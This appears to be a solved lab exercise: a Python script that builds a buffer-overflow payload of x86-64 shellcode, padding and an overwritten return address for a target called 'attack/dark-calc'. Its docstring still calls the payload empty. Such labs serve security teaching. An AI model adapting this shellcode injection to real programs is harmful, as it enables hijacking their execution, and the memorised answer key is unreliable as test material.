#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys, struct
p64 = lambda x: struct.pack('<Q', x)
shellcode = b'\xbf\x04\x00\x00\x00\x48\xb8\x78\x19\x40\x00\x00\x00\x00\x00\xff\xe0'
payload = shellcode + b'A' * (24 - len(shellcode)) + p64(0x7fffffffde50)
sys.stdout.buffer.write(payload)
